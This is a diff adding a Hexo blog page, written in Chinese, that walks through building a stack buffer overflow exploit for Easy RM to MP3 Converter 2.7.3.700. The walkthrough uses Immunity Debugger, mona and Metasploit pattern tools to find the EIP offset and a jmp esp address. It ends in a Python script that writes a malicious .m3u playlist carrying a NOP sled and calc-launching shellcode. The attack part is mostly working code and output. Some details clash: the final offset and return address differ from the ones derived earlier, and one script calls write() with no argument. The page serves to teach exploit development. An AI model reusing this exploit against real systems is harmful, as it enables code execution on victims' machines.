@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Whatever is worth doing is worth doing well !">
+    <meta name="author" content="ssooking">
+    
+    <title>
+        
+            Easy RM to MP3漏洞分析 |
+        
+        ssooking&#39;s notebook
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"ssooking.github.io","root":"/","language":"en","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep moving!"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":3};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                ssooking&#39;s notebook
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">Easy RM to MP3漏洞分析</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">ssooking</span>
+                        
+                            <span class="author-label">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2020-01-26 12:27:00</span>
+        <span class="mobile">2020-01-26 12:27</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        &gt; <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Pwn/">Pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/binary-exploitation/">binary-exploitation</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><ul>
+<li>系统：Win7 SP1 x64 (关闭安全防护)</li>
+<li>调试器：Immunity Debugger</li>
+<li>漏洞信息：<a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/9177" >https://www.exploit-db.com/exploits/9177<i class="fas fa-external-link-alt"></i></a></li>
+<li>漏洞软件：<a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/apps/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe" >Easy RM to MP3 Conversion Utility 2.7.3.700<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/pwn/202012612256.png" alt="202012612256"></p>
+<h1 id="Crash测试"><a href="#Crash测试" class="headerlink" title="Crash测试"></a>Crash测试</h1><p>生成Crash测试文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print &#x27;A&#x27; * 10000&quot;</span> &gt; crash.m3u</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>Easy RM to MP3 Convertes</code>加载<strong>Playlist Files</strong>文件，选择crash.m3u。加载后，程序会报错。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/pwn/2020126121646.png" alt="2020126121646"></p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/pwn/2020126122159.png" alt="2020126122159"></p>
+<p>程序未崩溃，说明我们的输入的Crash字符长度还不够。于是继续生成更长的crash字符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print &#x27;A&#x27; * 30000&quot;</span> &gt; crash.m3u</span><br></pre></td></tr></table></figure>
+
+<p>当加载30000个字符的文件时，程序崩溃。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/pwn/2020126125317.png" alt="2020126125317"></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>使用 Immunity Debugger打开RM2MP3Converter.exe，按下两次F9键运行程序，然后加载crash.m3u。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/pwn/2020126131032.png" alt="2020126131032"></p>
+<p>此时会看到<code>Access violation when executing [41414141]</code>，并且EIP的值被覆盖，说明程序存在经典缓冲区溢出漏洞。接下来使用mona插件进行漏洞利用开发。</p>
+<h2 id="1-⽣成测试字符"><a href="#1-⽣成测试字符" class="headerlink" title="1.⽣成测试字符"></a>1.⽣成测试字符</h2><p>在Immunity Debugger的命令执行窗口中输入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!mona pc 30000</span><br><span class="line">（!mona pattern_create 30000）</span><br></pre></td></tr></table></figure>
+
+<p>运⾏完在日志文件<code>C:\immdlogs\RM2MP3Converter\pattern.txt</code>中找到测试字符串。</p>
+<h2 id="2-确定EIP地址"><a href="#2-确定EIP地址" class="headerlink" title="2.确定EIP地址"></a>2.确定EIP地址</h2><p>编辑Python脚本，把上一步mona生成的测试字符串ASCII拷贝到测试mona30000.txt中，然后把mona30000.txt修改为mona30000.m3u。或者用下面的python脚本生成：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">mona_pattern = <span class="string">&quot;&quot;</span>    <span class="comment">#填写ASCII的内容</span></span><br><span class="line">bof = <span class="built_in">open</span>(<span class="string">&#x27;mona30000.m3u&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">bof.write(mona_pattern)</span><br><span class="line">bof.close()</span><br></pre></td></tr></table></figure>
+
+<p>然后加载mona30000.m3u。此时在调试器中可以看到<code>Access violation</code>标志，EIP的地址为<code>346C4833</code>。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/pwn/2020126143129.png" alt="2020126143129"></p>
+<h2 id="3-确定偏移量"><a href="#3-确定偏移量" class="headerlink" title="3.确定偏移量"></a>3.确定偏移量</h2><p>在确定了EIP地址后，需要计算距离EIP的偏移量。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!mona po 346C4833</span><br><span class="line">（!mona pattern_offset 346C4833）</span><br></pre></td></tr></table></figure>
+
+<p>此时在mona的日志窗口(ALT+L)中可以看到计算出的偏移量</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pattern 3Hl4 (0x346C4833) found <span class="keyword">in</span> cyclic pattern at position 5801</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，这里计算出的EIP偏移是5801，明显跟Crash测试中确定的范围25000-30000不符合。于是换个方法。</p>
+<h3 id="mona区间方式计算偏移"><a href="#mona区间方式计算偏移" class="headerlink" title="mona区间方式计算偏移"></a>mona区间方式计算偏移</h3><p><strong>确定造成程序崩溃的缓冲区长度区间</strong></p>
+<p>创建一个包含25000个A和5000个B的文件。加载后造成Crash，如果EIP包含41414141（AAAA），说明EIP位于20000和25000之间；如果EIP包含42424242（BBBB），则EIP位于25000和30000之间。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">bof = <span class="built_in">open</span>(<span class="string">&#x27;crash.m3u&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">bof.write(<span class="string">&#x27;A&#x27;</span>*<span class="number">25000</span>)</span><br><span class="line">bof.write(<span class="string">&#x27;B&#x27;</span>*<span class="number">5000</span>)</span><br><span class="line">bof.close()</span><br></pre></td></tr></table></figure>
+
+<p>经过测试，可以确定EIP的偏移位于25000-30000之间。于是前25000都用A填充，使用<code>!mona pc 5000</code>生成后5000个测试字符。使用下面的代码生成测试文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&quot;xxxx&quot;</span>        <span class="comment">#!mona pc 5000 =&gt; ASCII</span></span><br><span class="line">bof = <span class="built_in">open</span>(<span class="string">&#x27;eip.m3u&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">bof.write(<span class="string">&#x27;A&#x27;</span>*<span class="number">25000</span>)</span><br><span class="line">bof.write()</span><br><span class="line">bof.close()</span><br></pre></td></tr></table></figure>
+
+<p>同上述步骤，加载eip.m3u文件后，在调试器中确定了eip地址为<code>6B42306B</code>，执行<code>!mona po 6B42306B</code>计算得到偏移量为1081。这个偏移量再加上25000，即<code>25000+1081=26081</code>，因此正确的偏移量是26081。</p>
+<h3 id="Metasploit计算偏移量"><a href="#Metasploit计算偏移量" class="headerlink" title="Metasploit计算偏移量"></a>Metasploit计算偏移量</h3><p>Metasploit有辅助工具<code>pattern_create.rb</code>、<code>pattern_offset.rb</code>可以协助我们计算偏移量，用法与mona差不多。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ locate pattern_create.rb</span><br><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb</span><br></pre></td></tr></table></figure>
+
+<p>1.生成测试字符串</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 30000 &gt; pattern.txt</span><br></pre></td></tr></table></figure>
+
+<p>与上面相同的操作步骤确定EIP地址为346C4833。</p>
+<p>2.计算详细的偏移量。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 346C4833 -l 30000</span><br><span class="line">[*] Exact match at offset 5801</span><br><span class="line">[*] Exact match at offset 26081</span><br></pre></td></tr></table></figure>
+
+<p>可以推断，26081是正确的偏移量。</p>
+<h2 id="4-验证偏移量"><a href="#4-验证偏移量" class="headerlink" title="4.验证偏移量"></a>4.验证偏移量</h2><p>此时可以编写脚本，验证偏移量是否正确，如果正确，返回地址会被覆盖成我们测试的内容。这里设置理想情况下，EIP的值被覆盖为<code>BCDE</code>的十六进制值。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">bof = <span class="built_in">open</span>(<span class="string">&#x27;overeip.m3u&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">bof.write(<span class="string">&#x27;A&#x27;</span> * <span class="number">26081</span>)</span><br><span class="line">bof.write(<span class="string">&#x27;BCDE&#x27;</span>)    <span class="comment">#BCDE =&gt; 42434445</span></span><br><span class="line">bof.close()</span><br></pre></td></tr></table></figure>
+
+<p>加载overeip.m3u后，我们可以在调试器中看到EIP已经被精准覆盖成了<code>BCDE</code>的十六进制值。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/pwn/202012617912.png" alt="202012617912"></p>
+<p>确定了偏移量之后，可以开发漏洞利用代码了。</p>
+<h2 id="5-编写shellcode"><a href="#5-编写shellcode" class="headerlink" title="5.编写shellcode"></a>5.编写shellcode</h2><p>查看加载的模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona modules</span><br></pre></td></tr></table></figure>
+
+<p>我们使用”跳板”方式执行shellcode，可以在防护全关闭的模块中寻找。</p>
+<p>最好的是找到一个<code>ASLR = False</code>和<code>Rebase = False</code>的模块，但是唯一的模块就是RM2MP3Converter.exe。但是，我们不能使用该模块，因为它的地址中有一个空字节。因此，接下来要尝试的是查看具有<code>Rebase = True</code>和<code>ASLR = False</code>的模块在实践中是否不会移动，即使从原理上讲它可以重新建立基础。最后仅保留<code>ASLR = False</code>的模块。</p>
+<p>这里我在user32.dll中搜索<code>jmp esp</code>指令的地址。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!mona find -s <span class="string">&#x27;\xff\xe4&#x27;</span> -m 模块</span><br><span class="line">!mona find -s <span class="string">&quot;\xff\xe4&quot;</span> -m user32.dll</span><br><span class="line">!mona jmp -r esp -m user32.dll</span><br><span class="line">!mona jmp -r esp -m MSRMfilter03.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/pwn/2020126172212.png" alt="2020126172212"></p>
+<p>我们使用<code>0x7DC7FCDB</code>。接下来构造shellcode，使用弹计算器的shellcode。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;\x33\xC0&quot;</span>                          <span class="comment"># XOR EAX,EAX</span></span><br><span class="line"><span class="string">&quot;\x50&quot;</span>                              <span class="comment"># PUSH EAX</span></span><br><span class="line"><span class="string">&quot;\x68\x2E\x65\x78\x65&quot;</span>              <span class="comment"># PUSH &quot;.exe&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x63\x61\x6C\x63&quot;</span>              <span class="comment"># PUSH &quot;calc&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xC4&quot;</span>                          <span class="comment"># MOV EAX,ESP</span></span><br><span class="line"><span class="string">&quot;\x6A\x01&quot;</span>                          <span class="comment"># PUSH 1</span></span><br><span class="line"><span class="string">&quot;\x50&quot;</span>                              <span class="comment"># PUSH EAX</span></span><br><span class="line"><span class="string">&quot;\xBB\x41\x33\xDF\x7D&quot;</span>              <span class="comment"># MOV EBX,0x7ddf3341    (kernel32.WinExec)</span></span><br><span class="line"><span class="string">&quot;\xFF\xD3&quot;</span>                          <span class="comment"># CALL EBX</span></span><br><span class="line"><span class="string">&quot;\x53&quot;</span>                                                            <span class="comment"># PUSH EBX</span></span><br><span class="line"><span class="string">&quot;\xB8\x28\x7A\xD7\x7D&quot;</span>                            <span class="comment"># MOV EAX,0x7dd77a28    (kernel32.ExitProcess)</span></span><br><span class="line"><span class="string">&quot;\xFF\xD0&quot;</span>                                                    <span class="comment"># CALL EAX</span></span><br></pre></td></tr></table></figure>
+
+<p>其中系统库函数WinExec、ExitProcess的地址：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\arwin.exe Kernel32.dll WinExec         =&gt; 0x7ddf3341</span><br><span class="line">C:\arwin.exe Kernel32.dll ExitProcess =&gt; 0x7dd77a28</span><br></pre></td></tr></table></figure>
+
+<p>确定shellcode空间大小</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">junk = <span class="string">&quot;A&quot;</span>*<span class="number">26081</span></span><br><span class="line">over_eip_test = <span class="string">&#x27;BCDE&#x27;</span></span><br><span class="line">over_eip = struct.pack(<span class="string">&quot;&lt;L&quot;</span>,<span class="number">0x7dc7fcdb</span>)            <span class="comment">#!mona jmp -r esp -m user32.dll =&gt; 0x7dc7fcdb</span></span><br><span class="line">payload = <span class="string">&quot;F&quot;</span>*<span class="number">200</span></span><br><span class="line"></span><br><span class="line">payload = junk + over_eip_test + payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    bof = <span class="built_in">open</span>(<span class="string">&#x27;poctest.m3u&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    bof.write(payload)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Create exploit file successfully!&quot;</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Create exploit file failed!&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>加载后，我们看到F的位置就是能够输入的最大shellcode长度 ，即 192 字节</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/pwn/202012619936.png" alt="202012619936"></p>
+<p>下面就是shellcode部分了。下载calc.exe <a class="link"   target="_blank" rel="noopener" href="https://code.google.com/p/win-exec-calc-shellcode/" >shellcode<i class="fas fa-external-link-alt"></i></a>，并将其转换为十六进制格式。可参考博文：binary to shellcode。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    shellcode = <span class="string">&quot;\&quot;&quot;</span></span><br><span class="line">    ctr = <span class="number">1</span></span><br><span class="line">    maxlen = <span class="number">15</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;win-exec-calc-shellcode.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>).read():</span><br><span class="line">        shellcode += <span class="string">&quot;\\x&quot;</span> + b.encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> ctr == maxlen:</span><br><span class="line">        shellcode += <span class="string">&quot;\&quot; +\n\&quot;&quot;</span></span><br><span class="line">        ctr = <span class="number">0</span></span><br><span class="line">        ctr += <span class="number">1</span></span><br><span class="line">    shellcode += <span class="string">&quot;\&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span> shellcode</span><br></pre></td></tr></table></figure>
+
+<p>With my JMP ESP address and shellcode in hand, it was time to craft my full exploit.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bof = <span class="built_in">open</span>(<span class="string">&#x27;crash.m3u&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">bof.write(<span class="string">&#x27;A&#x27;</span>*<span class="number">26066</span>)  <span class="comment"># offset</span></span><br><span class="line">bof.write(<span class="string">&#x27;\xCC\x8C\x28\x76&#x27;</span>)  <span class="comment"># kernel32.dll JMP ESP (0x76288CCC)</span></span><br><span class="line">bof.write(<span class="string">&#x27;\x90&#x27;</span>*<span class="number">16</span>)  <span class="comment"># NOP sled</span></span><br><span class="line"><span class="comment"># win-exec-calc</span></span><br><span class="line">bof.write(<span class="string">&quot;\x31\xc9\x49\x31\xd2\xe3\x47\x52\x68\x63\x61\x6c\x63\x89\xe6&quot;</span> +  </span><br><span class="line"><span class="string">&quot;\x52\x56\x64\x8b\x72\x30\x8b\x76\x0c\x8b\x76\x0c\xad\x8b\x30&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x8b\x7e\x18\x8b\x5f\x3c\x8b\x5c\x1f\x78\x8b\x74\x1f\x20\x01&quot;</span> +</span><br><span class="line"><span class="string">&quot;\xfe\x8b\x4c\x1f\x24\x01\xf9\x0f\xb7\x2c\x51\x42\xad\x81\x3c&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x07\x57\x69\x6e\x45\x75\xf1\x8b\x74\x1f\x1c\x01\xfe\x03\x3c&quot;</span> +</span><br><span class="line"><span class="string">&quot;\xae\xff\xd7\x6a\x60\x5a\x68\x63\x61\x6c\x63\x54\x59\x48\x83&quot;</span> +</span><br><span class="line"><span class="string">&quot;\xec\x28\x65\x48\x8b\x32\x48\x8b\x76\x18\x48\x8b\x76\x10\x48&quot;</span> +</span><br><span class="line"><span class="string">&quot;\xad\x48\x8b\x30\x48\x8b\x7e\x30\x03\x57\x3c\x8b\x5c\x17\x28&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x8b\x74\x1f\x20\x48\x01\xfe\x8b\x54\x1f\x24\x0f\xb7\x2c\x17&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x8d\x52\x02\xad\x81\x3c\x07\x57\x69\x6e\x45\x75\xef\x8b\x74&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x1f\x1c\x48\x01\xfe\x8b\x34\xae\x48\x01\xf7\x99\xff\xd7&quot;</span>)</span><br><span class="line">bof.close()</span><br></pre></td></tr></table></figure>
+
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" >https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://samsclass.info/127/proj/easymp3-with-aslr.htm" >https://samsclass.info/127/proj/easymp3-with-aslr.htm<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://www.doyler.net/security-not-included/easy-rm-to-mp3-converter-2-7-3-buffer-overflow-exploit-tutorial" >https://www.doyler.net/security-not-included/easy-rm-to-mp3-converter-2-7-3-buffer-overflow-exploit-tutorial<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p><a class="link"   target="_blank" rel="noopener" href="http://scx020c07c.blogspot.com/2012/09/buffer-overflow-easy-rm-to-mp3-converter.html" >http://scx020c07c.blogspot.com/2012/09/buffer-overflow-easy-rm-to-mp3-converter.html<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+</ul>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：Easy RM to MP3漏洞分析</li>
+        <li>Post author：ssooking</li>
+        <li>Create time：2020-01-26 12:27:00</li>
+        <li>
+            Post link：https://ssooking.github.io/2020/01/easy-rm-to-mp3漏洞分析/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/binary-exploitation/">#binary-exploitation</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2020/01/binary-to-shellcode/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">binary to shellcode</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2020/01/proxmark3-nfc-attack/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Proxmark3 NFC Attack</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>
+              -
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">ssooking</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3</a>
+        </div>
